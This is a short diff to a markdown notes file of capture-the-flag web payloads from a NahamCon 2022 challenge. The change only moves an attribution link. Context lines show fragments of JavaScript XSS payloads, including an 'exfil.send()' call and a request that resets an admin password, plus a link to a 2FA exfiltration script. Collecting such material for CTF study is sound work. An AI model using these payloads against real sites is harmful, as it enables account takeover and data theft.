@@ -49,8 +49,7 @@ request2.send()
 ```
 > **Another script**: https://github.com/Crypto-Cat/CTF/blob/main/ctf_events/nahamcon_22/web/two_for_one/2fa_exfil.js
 
-# Reset password
-Taken from: https://github.com/Crypto-Cat/CTF/blob/main/ctf_events/nahamcon_22/web/two_for_one/reset_pw.js
+Reset password
 ```js
 // Reset admin password
 var http = new XMLHttpRequest();
@@ -73,3 +72,4 @@ exfil.send();
 http.setRequestHeader('Content-type', 'application/json');
 http.send(data);
 ```
+> **Taken from**: https://github.com/Crypto-Cat/CTF/blob/main/ctf_events/nahamcon_22/web/two_for_one/reset_pw.js
